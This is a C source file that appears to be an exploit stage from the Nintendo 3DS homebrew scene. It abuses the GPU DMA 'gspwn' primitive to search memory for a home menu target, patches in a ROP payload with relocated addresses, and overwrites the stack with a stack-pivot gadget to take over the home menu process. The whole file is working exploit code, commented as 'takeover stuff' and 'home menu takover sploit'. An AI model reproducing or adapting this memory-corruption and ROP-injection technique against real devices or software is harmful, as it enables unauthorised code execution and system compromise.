#include <stdlib.h>
#include <stdio.h>
#include <string.h>
//#include <ctr/types.h>
//#include <ctr/srv.h>
//#include <ctr/svc.h>
#include "types.h"
#define LOADROPBIN
#define N3DS 0

 u32* getThreadCommandBuffer(void);
 void svc_sleepThread(s64 ns);
 Result svc_closeHandle(Handle handle);
 Result svc_sendSyncRequest(Handle session);


#include "../../../build/constants.h"
//#include "../../../../app_targets/app_targets.h"
//#include "decomp.h"
#include "menu_payload_loadropbin_bin.h"
//#include "menu_ropbin_bin.h"

#define TOPFBADR1 ((u8*)CN_TOPFBADR1)
#define TOPFBADR2 ((u8*)CN_TOPFBADR2)

/*
void _memset(void *s, int c, int n){  //this is my recollection of memset. i'm sure it's not very good lol.
	
	while(n--) *(u8*)s++=(u8)c;
}
*/

int _strlen(char* str)
{
	int l=0;
	while(*(str++))l++;
	return l;
}

void _strcpy(char* dst, char* src)
{
	while(*src)*(dst++)=*(src++);
	*dst=0x00;
}	

Result GSP_FlushDCache(u32* addr, u32 size)
{
	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u32* addr, u32 size)=(void*)CN_GSPGPU_FlushDataCache_ADR;
	Handle* gspHandle=(Handle*)CN_GSPHANDLE_ADR;
	return _GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, addr, size);
}

Result _GSPGPU_ReleaseRight(Handle handle)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x170000; //request header code

	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

void doGspwn(u32* src, u32* dst, u32 size)
{
	Result (*nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue)(u32** sharedGspCmdBuf, u32* cmdAdr)=(void*)CN_nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue;
	u32 gxCommand[]=
	{
		0x00000004, //command header (SetTextureCopy)
		(u32)src, //source address
		(u32)dst, //destination address
		size, //size
		0xFFFFFFFF, // dim in
		0xFFFFFFFF, // dim out
		0x00000008, // flags
		0x00000000, //unused
	};

	u32** sharedGspCmdBuf=(u32**)(CN_GSPSHAREDBUF_ADR);
	nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue(sharedGspCmdBuf, gxCommand);
}

#if FIRM_LINEARSYSTEM != 0x38000000
void inject_payload(u32* linear_buffer, u32 target_address, u32* ropbin_linear_buffer, u32 ropbin_size, u32* rop_offset)
#else
void inject_payload(u32* linear_buffer, u32 target_address, u32* ropbin_linear_buffer, u32 ropbin_size)
#endif
{
	u32 target_base = target_address & ~0xFF;
	u32 target_offset = target_address - target_base;

	//read menu memory
	{
		GSP_FlushDCache(linear_buffer, 0x00002000);
		
		doGspwn((u32*)(target_base), linear_buffer, 0x00002000);
	}

	svc_sleepThread(10000000); //sleep long enough for memory to be read

	//patch memdump and write it
	{
		u32* payload_src;
		u32 payload_size;

		payload_src = (u32*)menu_payload_loadropbin_bin;
		payload_size = menu_payload_loadropbin_bin_size;
		#if FIRM_LINEARSYSTEM != 0x38000000
		if(rop_offset) *rop_offset += payload_src[payload_size / 4 - 1];
		#endif
		
		u32* payload_dst = &(linear_buffer)[target_offset/4];

		//patch in payload
		int i;
		for(i=0; i<payload_size/4; i++)
		{
			const u32 val = payload_src[i];;
			if(val < 0xBABE0000+0x200 && val > 0xBABE0000-0x200)
			{
				payload_dst[i] = val + target_address - 0xBABE0000;
			}else if((val & 0xFFFFFF00) == 0xFADE0000){
				switch(val & 0xFF)
				{
					case 1:
						// source ropbin + bkp linear address
						payload_dst[i] = (u32)ropbin_linear_buffer;
						break;
					case 2:
						// ropbin + bkp size
						payload_dst[i] = ropbin_size;
						break;
				}
			}else if(val != 0xDEADCAFE){
				payload_dst[i] = val;
			}
		}

		GSP_FlushDCache(linear_buffer, 0x00002000);

		doGspwn(linear_buffer, (u32*)(target_base), 0x00002000);
	}

	svc_sleepThread(10000000); //sleep long enough for memory to be written
}

int _main()
{
	Handle* gspHandle=(Handle*)CN_GSPHANDLE_ADR;
	u32* linear_buffer = (u32*)0x14200000;
	//Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u32* addr, u32 size)=(void*)CN_GSPGPU_FlushDataCache_ADR;

	for(int i=0; i<0x46500*2;i++)((u8*)CN_TOPFBADR1)[i]=00;
	
	#define PA_TO_VA(pa) ((pa) + 0x10000000)
	#define VA_TO_PA(pa) ((pa) - 0x10000000)	
	
	#if FIRM_LINEARSYSTEM != 0x38000000
	//const u32 start_addr = FIRM_LINEARSYSTEM + 0x00332000;
	const u32 start_addr = FIRM_LINEARSYSTEM + 0;
	const u32 end_addr = FIRM_LINEARSYSTEM + 0x00800000;
	const u32 block_size = 0x00010000;
	const u32 block_stride = block_size; // keep some overlap to make sure we don't miss anything (not needed with this new search)	
	#else
	const u32 start_addr = FIRM_LINEARSYSTEM;
	const u32 end_addr = FIRM_LINEARSYSTEM + 0x01000000;
	const u32 block_size = 0x00010000;
	const u32 block_stride = block_size-0x100; // keep some overlap to make sure we don't miss anything
	#endif
	
	u32* ropbin_linear_buffer = &((u32*)linear_buffer)[block_size];

	int cnt = 0;
	u32 block_start = 0;
	
	#if FIRM_LINEARSYSTEM != 0x38000000
	u32 start_paddr = 0;
	for(block_start = start_addr; block_start < end_addr; block_start += block_stride)
	{
		//read menu memory
		{
			GSP_FlushDCache(linear_buffer, 0x800000);
			
			doGspwn((u32*)(block_start), linear_buffer, block_size);
		}

		svc_sleepThread(10000000); //sleep long enough for memory to be read

		int i;
		for(i = 0; i < block_size; i += 4)
		{
			if(linear_buffer[i / 4] == ROP_MENU_TARGET_RET) break;
		}

		if(i < block_size)
		{
			//drawTitleScreen("searching for target...\n    target locked ! engaging.");

			start_paddr = VA_TO_PA(block_start + i);

			cnt++;

			break;
		}
	}

	u32 rop_paddr = (start_paddr & ~0xfff) + 0x2000;

	{

		inject_payload(linear_buffer, PA_TO_VA(rop_paddr), ropbin_linear_buffer, (MENU_LOADEDROP_BKP_BUFADR - MENU_LOADEDROP_BUFADR) * 2, &rop_paddr);
	}

	{
		const u32 block_size = 0x200;
		const u32 block_paddr = (start_paddr - 4 * 4) & ~0xff;
		const u32 start_offset = start_paddr - block_paddr;

		//_memset(linear_buffer, 0x00, block_size);


		// takeover stuff
		linear_buffer[start_offset / 4 - 4] = PA_TO_VA(start_paddr + 8);
		linear_buffer[start_offset / 4] = ROP_MENU_STACK_PIVOT;
		// stack pivot data
		// ldmdavc r4, {r4, r5, r8, sl, fp, ip, sp, pc}
		linear_buffer[start_offset / 4 + 1] = PA_TO_VA(rop_paddr); // sp
		linear_buffer[start_offset / 4 + 2] = ROP_MENU_POP_PC; // pc

		GSP_FlushDCache(linear_buffer, block_size);

		doGspwn(linear_buffer, (u32*)(PA_TO_VA(block_paddr)), block_size);
		
		svc_sleepThread(100000); //sleep long enough for memory to be read
	}
	#else
	u32 target_address = start_addr; //new3ds
	for(block_start=start_addr; block_start<end_addr; block_start+=block_stride)
	{
		//read menu memory
		{
			GSP_FlushDCache(linear_buffer, block_size);
			
			doGspwn((u32*)(block_start), linear_buffer, block_size);
		}

		svc_sleepThread(1000000); //sleep long enough for memory to be read

		int i;
		u32 end = block_size/4-0x10;
		for(i = 0; i < end; i++)
		{
			const u32* adr = &(linear_buffer)[i];
			if(adr[2] == 0x5544 && adr[3] == 0x80 && adr[6]!=0x0 && adr[0x1F] == 0x6E4C5F4E)break;
		}

		if(i < end)
		{
			//drawTitleScreen("searching for target...\n    target locked ! engaging.");
			target_address = block_start + i * 4;
			inject_payload(linear_buffer, target_address + 0x18, ropbin_linear_buffer, (MENU_LOADEDROP_BKP_BUFADR - MENU_LOADEDROP_BUFADR) * 2);
			block_start = target_address + 0x10 - block_stride;
			cnt++;
			break;
		}
	}
	#endif
	

	
	if(cnt)
	{
		block_start=5;
		while(1) {
			//drawTitleScreen("\n   The homemenu ropbin is ready.");
			for(int i=0; i<0x46500/2;i++)((u32*)CN_TOPFBADR1)[i]=i*block_start; 
			svc_sleepThread(100000000); //100ms
			for(int i=0; i<0x46500/2;i++)((u32*)CN_TOPFBADR1)[i]=i*i; //reasonably fun visual pattern
			svc_sleepThread(100000000);
			if(block_start==0) break;
			block_start--;
		}
	}else{
		while(1) {
		//drawTitleScreen("\n   failed to locate takeover object :(");
		for(int i=0; i<0x46500*2;i++)((u8*)CN_TOPFBADR1)[i]=0xff; //white screen of death, like a blizzard or something
		svc_sleepThread(250000000);
		}
	}



	//svc_sleepThread(100000000); //sleep long enough for memory to be written

	//svc_sleepThread(0xffffffff);
	
	_GSPGPU_ReleaseRight(*gspHandle);
	svc_closeHandle(*gspHandle);
	
	//_aptExit();
	void (*app_exit)() = (void*)CN_APPEXIT; //use cninja's own code for the app exit, which is necessary to trigger smea's home menu takover sploit and allow 3ds dlp to be launched for *hax. also saves a lot of space not having all of those APT functions weighing down the code. we only have about 2.5KB to start with (due to QR format's limit).
	app_exit();
	//svc_exitProcess();
	//__asm__ ("svc 3");

	while(1);
	//void (*reset)(u32 size)=(void*)CN_3DSX_LOADADR;
	//reset(0xC000);

	return 0;
}